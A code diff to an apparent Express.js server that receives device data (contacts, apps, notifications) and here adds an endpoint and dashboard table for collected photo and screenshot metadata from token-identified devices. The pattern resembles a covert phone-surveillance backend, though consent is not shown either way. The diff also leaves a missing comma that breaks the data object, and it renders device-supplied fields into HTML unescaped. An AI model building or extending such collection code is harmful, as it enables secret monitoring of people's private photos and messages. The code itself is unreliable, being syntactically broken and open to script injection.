@@ -13,6 +13,7 @@ const data = {
   contacts: [],
   apps: [],
   notifications: []
+  media: []
 };
 
 // Middleware to get device token
@@ -83,6 +84,14 @@ app.post('/device/notifications', (req, res) => {
     res.json({ success: true });
 });
 
+app.post('/device/media', (req, res) => {
+    const token = getToken(req);
+    const media = req.body.map(m => ({ token, ...m }));
+    data.media = data.media.filter(m => m.token !== token);
+    data.media.push(...media);
+    console.log(`${media.length} media from ${token}`);
+    res.json({ success: true });
+});
 // Dashboard - view all data
 app.get('/', (req, res) => {
     res.send(`
@@ -211,6 +220,20 @@ app.get('/', (req, res) => {
               </tr>
            `).join('')}
          </table>
+
+<h2>Media & Screenshots</h2>
+<table>
+    <tr><th>Device</th><th>Filename</th><th>Type</th><th>Size</th><th>Date Taken</th></tr>
+    ${data.media.map(m => `
+        <tr>
+            <td>${m.token}</td>
+            <td>${m.filename}</td>
+            <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
+            <td>${Math.round(m.size_bytes / 1024)}KB</td>
+            <td>${new Date(m.date_taken).toLocaleString()}</td>
+        </tr>
+    `).join('')}
+</table>
 
     </body>
     </html>
